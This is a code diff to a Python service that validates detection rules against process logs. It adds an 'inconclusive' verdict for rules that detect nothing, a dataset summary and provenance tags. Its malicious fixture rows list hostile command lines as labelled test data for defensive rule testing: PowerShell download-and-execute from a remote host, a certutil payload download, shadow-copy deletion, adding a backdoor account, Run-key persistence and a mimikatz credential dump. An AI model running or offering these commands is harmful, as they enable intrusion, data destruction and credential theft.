@@ -140,10 +140,15 @@ class ValidationService:
         fp_samples = self._extract_samples(historical_logs_df, (y_true == 0) & (y_pred == 1), limit=20)
         fn_samples = self._extract_samples(historical_logs_df, (y_true == 1) & (y_pred == 0), limit=20)
 
-        # 6. Evaluation Verdict
-        passed = (fpr <= fpr_threshold) and (precision >= precision_threshold)
-        verdict = "PASSED" if passed else "FAILED"
-        if passed:
+        # 6. Evaluation Verdict. A rule that detects no labelled malicious sample proves nothing:
+        # FPR 0 and the "no alerts" precision would otherwise make it pass vacuously.
+        dataset = self.dataset_summary(historical_logs_df)
+        passed = tp > 0 and (fpr <= fpr_threshold) and (precision >= precision_threshold)
+        verdict = "PASSED" if passed else ("INCONCLUSIVE" if tp == 0 and fp == 0 else "FAILED")
+        if verdict == "INCONCLUSIVE":
+            reason = ("Không đủ dữ liệu kiểm định: rule không khớp mẫu độc hại nào trong tập kiểm định "
+                      f"({dataset['malicious_fixture']} mẫu dương tính cố định, chủ yếu Windows).")
+        elif passed:
             reason = f"Rule passed validation with acceptable FPR ({fpr:.2%}) and Precision ({precision:.2%})."
         else:
             reasons = []
@@ -165,6 +170,7 @@ class ValidationService:
             "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
             "verdict": verdict,
             "reason": reason,
+            "dataset": dataset,
         }
 
         # 7. Optional LLM Explanation if FPR exceeds threshold
@@ -396,6 +402,20 @@ class ValidationService:
                 return clean or content.strip()
         return None
 
+    @staticmethod
+    def dataset_summary(df: pd.DataFrame) -> Dict[str, Any]:
+        """Composition of the evaluation set, so metrics are never presented as more than they are."""
+        source = df["provenance"] if "provenance" in df else pd.Series(["unknown"] * len(df))
+        real = df[source == "process_info"]
+        return {
+            "total": int(len(df)),
+            "real_process_info": int(len(real)),
+            "real_labelled_suspicious": int(real["is_malicious"].sum()) if len(real) else 0,
+            "synthetic_benign": int((source == "synthetic_benign").sum()),
+            "malicious_fixture": int((source == "fixture_malicious").sum()),
+            "label_source": "process_info.is_suspicious + bộ mẫu dương tính cố định",
+        }
+
     async def load_historical_logs(self, db_session=None) -> Tuple[pd.DataFrame, pd.Series]:
         """
         Load historical logs from DB (ProcessInfo) + known threat patterns to form
@@ -419,7 +439,8 @@ class ValidationService:
                         "host": p.agent_id or "WIN-DEMO",
                         "parent": "",
                         "timestamp": str(p.created_at) if p.created_at else "2026-11-15T10:00:00Z",
-                        "is_malicious": 1 if p.is_suspicious else 0
+                        "is_malicious": 1 if p.is_suspicious else 0,
+                        "provenance": "process_info",
                     })
             except Exception as e:
                 logger.warning(f"Failed to query process_info from DB: {e}")
@@ -427,31 +448,31 @@ class ValidationService:
         # If DB had few or no records, supplement with realistic baseline logs
         if len(benign_rows) < 50:
             synthetic_benign = [
-                {"process": "explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "host": "WIN-DEMO-01", "parent": "userinit.exe", "timestamp": "2026-11-15T09:00:00Z", "is_malicious": 0},
-                {"process": "svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "host": "WIN-DEMO-01", "parent": "services.exe", "timestamp": "2026-11-15T09:01:00Z", "is_malicious": 0},
-                {"process": "chrome.exe", "cmdline": "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "host": "WIN-DEMO-01", "parent": "chrome.exe", "timestamp": "2026-11-15T09:02:00Z", "is_malicious": 0},
-                {"process": "python.exe", "cmdline": "python.exe C:\\larp\\agent\\win_agent_minimal.py", "host": "WIN-DEMO-01", "parent": "cmd.exe", "timestamp": "2026-11-15T09:03:00Z", "is_malicious": 0},
-                {"process": "powershell.exe", "cmdline": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "host": "WIN-DEMO-01", "parent": "taskeng.exe", "timestamp": "2026-11-15T09:04:00Z", "is_malicious": 0},
-                {"process": "cmd.exe", "cmdline": "cmd.exe /c echo %PATH%", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:05:00Z", "is_malicious": 0},
-                {"process": "conhost.exe", "cmdline": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "host": "WIN-DEMO-02", "parent": "cmd.exe", "timestamp": "2026-11-15T09:06:00Z", "is_malicious": 0},
-                {"process": "code.exe", "cmdline": "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:07:00Z", "is_malicious": 0},
-                {"process": "nginx.exe", "cmdline": "nginx -g \"daemon off;\"", "host": "LINUX-AGENT", "parent": "systemd", "timestamp": "2026-11-15T09:08:00Z", "is_malicious": 0},
-                {"process": "bash", "cmdline": "/bin/bash /usr/local/bin/healthcheck.sh", "host": "LINUX-AGENT", "parent": "cron", "timestamp": "2026-11-15T09:09:00Z", "is_malicious": 0},
+                {"process": "explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "host": "WIN-DEMO-01", "parent": "userinit.exe", "timestamp": "2026-11-15T09:00:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "host": "WIN-DEMO-01", "parent": "services.exe", "timestamp": "2026-11-15T09:01:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "chrome.exe", "cmdline": "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "host": "WIN-DEMO-01", "parent": "chrome.exe", "timestamp": "2026-11-15T09:02:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "python.exe", "cmdline": "python.exe C:\\larp\\agent\\win_agent_minimal.py", "host": "WIN-DEMO-01", "parent": "cmd.exe", "timestamp": "2026-11-15T09:03:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "powershell.exe", "cmdline": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "host": "WIN-DEMO-01", "parent": "taskeng.exe", "timestamp": "2026-11-15T09:04:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "cmd.exe", "cmdline": "cmd.exe /c echo %PATH%", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:05:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "conhost.exe", "cmdline": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "host": "WIN-DEMO-02", "parent": "cmd.exe", "timestamp": "2026-11-15T09:06:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "code.exe", "cmdline": "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:07:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "nginx.exe", "cmdline": "nginx -g \"daemon off;\"", "host": "LINUX-AGENT", "parent": "systemd", "timestamp": "2026-11-15T09:08:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
+                {"process": "bash", "cmdline": "/bin/bash /usr/local/bin/healthcheck.sh", "host": "LINUX-AGENT", "parent": "cron", "timestamp": "2026-11-15T09:09:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
             ]
             benign_rows.extend(synthetic_benign)
 
         # Realistic malicious dataset for true positive measurement
         malicious_rows = [
-            {"process": "powershell.exe", "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=", "host": "ATTACK-VICTIM", "parent": "word.exe", "timestamp": "2026-11-15T11:00:00Z", "is_malicious": 1},
-            {"process": "powershell.exe", "cmdline": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.30.104/rev.ps1')", "host": "ATTACK-VICTIM", "parent": "excel.exe", "timestamp": "2026-11-15T11:01:00Z", "is_malicious": 1},
-            {"process": "vssadmin.exe", "cmdline": "vssadmin.exe delete shadows /all /quiet", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:02:00Z", "is_malicious": 1},
-            {"process": "wmic.exe", "cmdline": "wmic shadowcopy delete /nointeractive", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:03:00Z", "is_malicious": 1},
-            {"process": "certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://malicious.cdn/payload.exe payload.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:04:00Z", "is_malicious": 1},
-            {"process": "net.exe", "cmdline": "net user backdoor P@ssw0rd123! /add", "host": "ATTACK-VICTIM", "parent": "powershell.exe", "timestamp": "2026-11-15T11:05:00Z", "is_malicious": 1},
-            {"process": "reg.exe", "cmdline": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:06:00Z", "is_malicious": 1},
-            {"process": "mimikatz.exe", "cmdline": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:07:00Z", "is_malicious": 1},
-            {"process": "rundll32.exe", "cmdline": "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:08:00Z", "is_malicious": 1},
-            {"process": "whoami.exe", "cmdline": "whoami /priv", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:09:00Z", "is_malicious": 1},
+            {"process": "powershell.exe", "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=", "host": "ATTACK-VICTIM", "parent": "word.exe", "timestamp": "2026-11-15T11:00:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "powershell.exe", "cmdline": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.30.104/rev.ps1')", "host": "ATTACK-VICTIM", "parent": "excel.exe", "timestamp": "2026-11-15T11:01:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "vssadmin.exe", "cmdline": "vssadmin.exe delete shadows /all /quiet", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:02:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "wmic.exe", "cmdline": "wmic shadowcopy delete /nointeractive", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:03:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://malicious.cdn/payload.exe payload.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:04:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "net.exe", "cmdline": "net user backdoor P@ssw0rd123! /add", "host": "ATTACK-VICTIM", "parent": "powershell.exe", "timestamp": "2026-11-15T11:05:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "reg.exe", "cmdline": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:06:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "mimikatz.exe", "cmdline": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:07:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "rundll32.exe", "cmdline": "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:08:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
+            {"process": "whoami.exe", "cmdline": "whoami /priv", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:09:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
         ]
 
         all_rows = benign_rows + malicious_rows
